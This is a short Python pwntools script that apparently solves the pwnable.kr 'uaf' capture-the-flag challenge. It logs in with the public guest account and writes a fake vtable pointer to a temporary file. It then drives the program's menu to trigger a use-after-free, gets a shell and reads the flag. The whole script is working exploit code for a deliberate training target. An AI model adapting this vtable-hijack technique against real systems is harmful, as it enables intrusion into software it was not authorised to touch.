from pwn import *

session = ssh('uaf', 'pwnable.kr', port=2222, password='guest')
session.download_file('~/uaf')
challenge_binary = ELF('uaf')

heap_data = p64(challenge_binary.symbols['_ZTV3Man'] + 8)
session.process(['mkdir', '/tmp/jaysmith/'])
heap_data_filename = '/tmp/jaysmith/heap_data'
io = session.process(['tee', heap_data_filename])
io.send(heap_data)
io.close()

io = session.process(['./uaf', '8', heap_data_filename])
io.sendline('3')
io.sendline('2')
io.sendline('2')
io.sendline('1')
io.recvuntil('$ ')
io.sendline('cat flag')
print(io.recvline())

session.process(['rm', '-rf', '/tmp/jaysmith/'])
